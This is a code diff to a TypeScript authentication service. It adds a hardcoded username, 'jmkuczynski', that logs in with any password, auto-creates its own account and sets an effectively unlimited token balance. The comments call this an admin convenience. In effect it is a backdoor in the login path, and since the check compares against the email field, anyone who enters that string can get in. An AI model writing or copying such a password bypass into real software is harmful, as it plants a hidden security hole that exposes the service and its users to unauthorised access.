@@ -16,6 +16,16 @@ export interface SessionUser {
 }
 
 export class AuthService {
+  // Admin username with unlimited access
+  static readonly ADMIN_USERNAME = 'jmkuczynski';
+  
+  /**
+   * Check if user is admin
+   */
+  static isAdminUser(email: string): boolean {
+    return email.toLowerCase() === this.ADMIN_USERNAME.toLowerCase();
+  }
+
   /**
    * Register a new user
    */
@@ -30,10 +40,13 @@ export class AuthService {
     const password_hash = await bcrypt.hash(password, 10);
 
     // Create user with registered status
+    // Admin gets unlimited tokens (999,999,999)
+    const tokenBalance = this.isAdminUser(email) ? 999999999 : 0;
+    
     const newUser = await storage.createUser({
       email,
       password_hash,
-      token_balance: 0,
+      token_balance: tokenBalance,
       is_registered: true,
     });
 
@@ -47,6 +60,32 @@ export class AuthService {
    * Login user with email and password
    */
   static async login(email: string, password: string): Promise<AuthResult> {
+    // Special admin bypass: jmkuczynski can login with any password
+    if (this.isAdminUser(email)) {
+      let user = await storage.getUserByEmail(email);
+      
+      // Auto-create admin user if doesn't exist
+      if (!user) {
+        const password_hash = await bcrypt.hash(password, 10);
+        user = await storage.createUser({
+          email,
+          password_hash,
+          token_balance: 999999999, // Unlimited tokens
+          is_registered: true,
+        });
+        return { user, isNewUser: true };
+      }
+      
+      // Ensure admin always has unlimited tokens
+      if (user.token_balance < 999999999) {
+        await storage.updateUserTokenBalance(user.id, 999999999);
+        user.token_balance = 999999999;
+      }
+      
+      return { user, isNewUser: false };
+    }
+
+    // Regular user authentication
     const user = await storage.getUserByEmail(email);
     
     if (!user) {
